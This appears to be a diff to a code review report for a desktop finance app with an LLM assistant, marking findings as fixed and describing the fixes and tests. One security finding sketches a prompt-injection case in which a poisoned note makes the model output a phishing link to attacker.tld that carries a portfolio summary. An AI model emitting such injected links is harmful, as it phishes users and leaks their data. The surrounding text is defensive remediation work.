@@ -15,9 +15,9 @@ Read-only review of the 47 commits on `main` not yet on `origin/main` (234 files
 | 5 | Medium | Correctness | `src/llm/tools.ts:288` | Divide-by-zero guard checks the wrong variable — **fixed** |
 | 6 | Medium | Correctness | `src/llm/tools.ts:259` | `list_assets` truncates before sorting — **fixed** |
 | 7 | Medium | Correctness | `src/llm/service.ts:206` | `confirmAction` race: double confirm — **fixed** |
-| 8 | Medium | Security | `src/ui/pages/chat/ChatPage.tsx:506` | Assistant links can navigate the app window |
-| 9 | Low | Correctness | `src/db/repositories/assets.ts:149` | First snapshot dated in UTC, not local time |
-| 10 | Low | Correctness | `src/llm/tools.ts:394` | Wrong "already exists" value; impossible dates accepted |
+| 8 | Medium | Security | `src/ui/pages/chat/ChatPage.tsx:506` | Assistant links can navigate the app window — **fixed** |
+| 9 | Low | Correctness | `src/db/repositories/assets.ts:149` | First snapshot dated in UTC, not local time — **fixed** |
+| 10 | Low | Correctness | `src/llm/tools.ts:394` | Wrong "already exists" value; impossible dates accepted — **fixed** |
 
 Minor items are listed at the end.
 
@@ -97,6 +97,28 @@ Assistant markdown renders clickable links with no custom `a` component, and `li
 **Scenario:** a prompt-injected note or memory makes the model output `[Re-enter your API key](https://attacker.tld/?d=<portfolio summary>)`. One click replaces the app UI with a phishing page that has no back button, and the URL leaks data.
 
 **Fix:** render links with a custom component that opens them externally (opener plugin) after a confirmation, and block non-app origins with `on_navigation`.
+
+**Status: done (2026-11-01, 0.4.0).** The `on_navigation` half of the suggested
+fix does not exist in Tauri v2 (`Builder::on_navigation` is not in the API), so the
+guard is done in the webview instead:
+
+- **`src/lib/externalLinks.ts`** installs one capturing `click` listener on the
+  document, before React renders. Any click on an absolute `http(s)` link calls
+  `preventDefault()` and asks Rust to open it in the default browser
+  (`open_external`). Hash routes (`#/assets`), relative hrefs, modifier-clicks
+  (open in a new tab intent) and non-web schemes are left untouched.
+- **`open_external`** (`src-tauri/src/commands/files.rs`) re-checks the scheme and
+  refuses anything that is not `http://` or `https://`, so a `file:` or
+  `javascript:` URL can never reach the system opener even if the webview guard is
+  bypassed.
+- Fixed once, for the whole document, rather than per component: replies are
+  rendered in three places (message history, the streaming bubble, the delete
+  modal) and a custom `a` component would have to be threaded through each.
+
+Covered by nine jsdom tests (https, http, hash route, relative path, `file:`,
+a rejected command, a modifier-click, a click on a child element, and
+reinstall) and a Rust test for the scheme refusal. SECURITY.md's "Webview and
+IPC" section documents both halves.
 
 ## Correctness
 
@@ -208,6 +230,10 @@ The default date uses `new Date().toISOString()` instead of `todayIso()` from `s
 
 **Fix:** use `todayIso()`.
 
+**Status: done (2026-11-01, 0.4.0).** `createAsset` dates the first snapshot with
+`todayIso()`, and a repository test asserts the emitted statement carries the
+local day.
+
 ### 10. Low — Wrong "already exists" value; impossible dates accepted
 
 **Where:** `src/llm/tools.ts:394`
@@ -218,12 +244,35 @@ When a snapshot already exists on the proposed date, the warning shows the asset
 
 **Fix:** use `getSnapshotOn(assetId, isoDate)` (as `confirmAction` already does), and validate the date with the helpers in `src/domain/dates.ts`.
 
+**Status: done (2026-11-01, 0.4.0).** `propose_snapshot` reads the existing
+snapshot with `getSnapshotOn(assetId, isoDate)` and warns with *that* value, and
+the date is checked with `isValidIsoDate`, so `2026-02-31` is refused instead of
+stored. Two tests pin both: the warning mentions the value on the proposed date
+(not the asset's latest) and calls `getSnapshotOn` with the right pair, and an
+impossible date returns an error without staging an action.
+
 ## Minor
 
+Both code items are **done** (2026-11-01, 0.4.0); the SSE item was already fixed
+with #3.
+
 - **`deleteProvider`** removes the Keychain key before the database delete succeeds. If the delete fails, the provider stays without a key. Delete the row first, then the key.
+  *Done:* the rows are deleted first and the Keychain item after, so a failed
+  delete leaves a provider that keeps its key and can be retried. Two tests: the
+  call order (`runTransaction` before `secret_delete`) and that a failed delete
+  never touches the Keychain.
 - **`createAsset`** reads the new id from `sqlite_sequence`, which can run on a different pooled connection. Use `RETURNING id` or the `lastInsertId` from the same `execute`.
+  *Done:* new `run_transaction_returning_id` command, backed by
+  `execute_statements_returning_id`, reads `sqlite_sequence` **inside** the
+  transaction on the same connection. Rust tests cover the returned id for two
+  successive batches, a rolled-back batch (no id, nothing written) and an empty
+  batch.
 - **SSE parsing** drops the last line if the stream ends without a trailing newline. Flush the remaining buffer when the stream ends.
+  *Done with #3:* `LineBuffer` flushes the trailing line, with a test.
 - **Updater endpoint** in `tauri.conf.json` is still the `OWNER` placeholder while `updater:default` is granted (already noted in SECURITY.md and `docs/RELEASE.md`).
+  *Not a code fix:* it needs the real repository URL and a release, so it stays a
+  release task in `docs/RELEASE.md`. Until then the updater's only visible effect
+  is a failed check.
 
 ## Not covered yet
 
